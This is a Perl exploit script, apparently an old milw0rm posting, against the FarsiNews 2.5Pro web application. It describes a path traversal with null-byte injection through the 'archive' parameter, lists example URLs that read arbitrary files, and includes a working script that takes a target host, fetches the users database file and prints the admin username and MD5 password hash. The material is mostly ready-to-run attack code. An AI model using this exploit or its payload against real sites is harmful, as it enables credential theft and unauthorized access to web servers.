#!/usr/bin/perl
#
# FarsiNews 2.5pro Show User&Passowrd
# Exploit by Hessam-x (www.hessamx.net)
#
#
######################################################
#  ___ ___                __                         #
# /   |   \_____    ____ |  | __ ___________________ #
#/    ~    \__  \ _/ ___\|  |/ // __ \_  __ \___   / #
#\    Y    // __ \\  \___|    <\  ___/|  | \//    /  #
# \___|_  /(____  /\___  >__|_ \\___  >__|  /_____ \ #
#       \/      \/     \/     \/    \/            \/ #
#             Iran Hackerz Security Team             #
#               WebSite: www.hackerz.ir              #
#                                                    #
######################################################
# Description                                        #
#                                                    #
# Name    : FarsiNews [www.farsinewsteam.com]        #
# version : 2.5Pro                                   #
######################################################
# in FarsiNews if you change the archive value :
# http://localhost/index.php?archive=hamid
# see :
# Warning: file([PATH]/data/archives/hamid.news.arch.php):
# failed to open stream: No such file or directory in [PATH]\inc\shows.inc.php on line 642
# Warning: file([PATH]/data/archives/hamid.comments.arch.php):
# failed to open stream: No such file or directory in [PATH]\inc\shows.inc.php on line 686
# ...[and many other error]
# it means that shows.inc.php  try to open  '/archives/hamid.news.arch.php'  (and also 'hamid.comments.arch.php')  to read it's data .
# we can change the archive value to '/../users.db.php%00' to see all username and password .
# Exploit :
# http://localhost/index.php?archive=/../users.db.php%00
# http://localhost/Farsi1/index.php?archive=/../[file-to-read]%00
# F0und by hamid
use LWP::Simple;

print "-------------------------------------------\n";
print "=             Farsinews 2.5Pro            =\n";
print "=       By Hessam-x  - www.hackerz.ir     =\n";
print "-------------------------------------------\n\n";


       print "Target(www.example.com)\> ";
       chomp($targ = <STDIN>);

       print "Path: (/fn25/)\>";
       chomp($path=<STDIN>);

$url = "index.php?archive=/../users.db.php%00";
$page = get("http://".$targ.$path.$url) || die "[-] Unable to retrieve: $!";
print "[+] Connected to: $targ\n";

$page =~ m/<img alt="(.*?)" src=/ && print "[+] Username:\n $1\n";
$page =~ m/style="border: none;" align="right" \/>(.*?)<\/font>/ && print "[+] MD5 Password:\n $1\n";

print "[-] Unable to retrieve User ID\n" if(!$1);

# milw0rm.com [2006-02-28]